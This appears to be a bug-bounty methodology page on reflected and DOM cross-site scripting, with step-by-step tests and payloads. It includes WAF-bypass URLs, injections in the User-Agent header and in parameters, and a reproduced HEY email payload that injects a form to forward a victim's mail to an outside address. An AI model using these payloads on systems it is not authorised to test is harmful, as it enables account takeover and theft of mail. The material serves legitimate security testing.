# Reflected Cross Site Scripting

## Check List

## Methodology

### Black Box

#### [XSS Reflected](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Log in to any platform that allows creating or editing text-based pages (such as a Wiki or documentation system)
{% endstep %}

{% step %}
Create a new page
{% endstep %}

{% step %}
In the field for the page identifier or slug, enter `javascript:`
{% endstep %}

{% step %}
Configure the page as follows

Title: `javascript:`

Format: Markdown

Content: `[XSS](.alert(1);)`
{% endstep %}

{% step %}
Save or publish the page
{% endstep %}

{% step %}
After the page is created, click the link labeled “XSS” in the page content
{% endstep %}

{% step %}
If the system is vulnerable, the JavaScript code will execute (e.g., an `alert(1)` will appear)
{% endstep %}
{% endstepper %}

***

#### [XSS IN Email](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Create a new text file (e.g. `email.txt`)
{% endstep %}

{% step %}
Put the following exact contents into the file (including headers and `Content-type: text/html`)

```http
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
```
{% endstep %}

{% step %}
Send the email using `sendmail` on Linux as an example

```bash
/usr/sbin/sendmail -t < email.txt
```

(or use any other tool capable of sending raw MIME/HTML emails)
{% endstep %}

{% step %}
Open the recipient’s HEY account and load the sent email (refresh the inbox/viewer if needed)
{% endstep %}

{% step %}
Inspect the rendered HTML to find injected tags or form elements (e.g. injected `<form ...>` or `<iframe ...>`)
{% endstep %}

{% step %}
Observe any automatic behaviors triggered by the injected HTML (such as POST requests to create forwarding or a full-window iframe)
{% endstep %}

{% step %}
Repeat with the alternative payload examples from the report (iframe-based spoof or `<script src=...>` + hcaptcha payload) to verify other exploitation vectors
{% endstep %}
{% endstepper %}

***

#### [Reflected XSS In Marketing Reports Page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#wrapper-javascript)

{% stepper %}
{% step %}
Log in to the store's website and complete the authentication process
{% endstep %}

{% step %}
Then go to the report section in your profile
{% endstep %}

{% step %}
When you enter the page, check the URL and find parameters like `return_page_pathname=` (may be different in each site)
{% endstep %}

{% step %}
Inject the parameter using the following payload and check if the code is executed or not

```
javascript:alert('XSS')
```
{% endstep %}

{% step %}
If it is implemented, we hit a vulnerability
{% endstep %}
{% endstepper %}

***

#### [Reflected Cross Site Scripting (XSS) Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Enter a site and complete the authentication process
{% endstep %}

{% step %}
In the authentication process, make an error on one of the parameters so that the authentication process fails
{% endstep %}

{% step %}
If you encounter errmssg parameters in subsequent requests, inject xss-related payloads in these parameters
{% endstep %}

{% step %}
For example, like this request below

```
errmsg = [https://102.176.160.119:10443/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
```
{% endstep %}
{% endstepper %}

***

#### [DOM XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Bring up the Burp tool and make a request to the main page of the site
{% endstep %}

{% step %}
In the Response section, click on the search section and search for the word `window.location.hash` and check if it exists or not
{% endstep %}

{% step %}
If there is, inject the payload as shown below and see if it is reflected or not

```
https://www.example.com/#<img src=x onerror=alert('XSS')>
```
{% endstep %}
{% endstepper %}

***

#### [DOM XSS in redirect param](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Logout website
{% endstep %}

{% step %}
Get the request using Burp and check the request
{% endstep %}

{% step %}
In the requests review, if you find a request like the one below, inject the payload

```
https://subdomain.example.net/?redirect=javascript:prompt(document.domain)%2f%2f 
```
{% endstep %}

{% step %}
Log in through email
{% endstep %}
{% endstepper %}

***

#### [XSS Reflected in Redirect\_url](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-for-uri)

{% stepper %}
{% step %}
Log in to the site and complete the registration process
{% endstep %}

{% step %}
Trace the registration process using Burp and inspect the parameters
{% endstep %}

{% step %}
If you see a parameter called redirect\_url, inject the following payload as shown below:

```http
https://example.net/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain)
```
{% endstep %}

{% step %}
If the code is reflected, the vulnerability has occurred
{% endstep %}
{% endstepper %}

***

#### [Payload For WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md)

{% stepper %}
{% step %}
```http
https://www.example.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.example.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}
{% endstepper %}

***

#### [Location Information Parameter ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md#polyglot-xss)

{% stepper %}
{% step %}
Log in to your account and profile on the target site
{% endstep %}

{% step %}
Go to the general section of your account and enter the street address, city, and the following payload

```javascript
/"><!--><svg/onload=alert(document.domain)>)
```
{% endstep %}

{% step %}
After injection, save and log in to see your location information and live view
{% endstep %}

{% step %}
For example, something like the path below (keep in mind that this path can be different for each site)

```http
https://example.com/user/dashboards/live
```
{% endstep %}
{% endstepper %}

***

#### Reflected In ContactForm

{% stepper %}
{% step %}
Log in to the target site and find the contact support feature
{% endstep %}

{% step %}
Then, using the Burp suite tool, make a request to this page and use the `GAP` extension to identify all the parameters of this page
{% endstep %}

{% step %}
Then you can identify the parameters of the support contact page using the x8 tool and the following command

```bash
x8 -u "https://target.com/ContactForm" -w wordlists_parameter.txt -m 25
```
{% endstep %}

{% step %}
If a parameter is found that is reflected, run the XSS tests. If it is executed, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### User-Agent Header

{% stepper %}
{% step %}
Log in to the target site and record the requests using the Burp Suite tool
{% endstep %}

{% step %}
Then send a request to Repeater using the Burp suite tool
{% endstep %}

{% step %}
Then replace the User-Agent header value with the following payload and submit the request

```http
User-Agent: Mozilla/5.0 <script>alert`XSS`</script>
User-Agent: <svg/onload=alert(1)>
User-Agent: </title><script>alert(1)</script>
User-Agent: JavaScript:alert(1)   (if reflected inside javascript: context)
```
{% endstep %}

{% step %}
Refresh the page where the User-Agent is displayed
{% endstep %}

{% step %}
If alert pops → XSS confirmed
{% endstep %}
{% endstepper %}

***

#### Language Parameter

{% stepper %}
{% step %}
Log into the target site and record the requests using the Burp Suite tool
{% endstep %}

{% step %}
Check the requests to see if there is a parameter called lang or language in the request, like the one below

```http
GET /api/v1/path?&lang=en
Host: target.com
Cookie: . . . .
Accept-Language: en-US
```
{% endstep %}

{% step %}
Then inject an XSS payload in front of the value of this parameter

```http
GET /api/v1/path?&lang=en"><script>alert(1)</script>
Host: target.com
Cookie: . . . .
Accept-Language: en-US
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
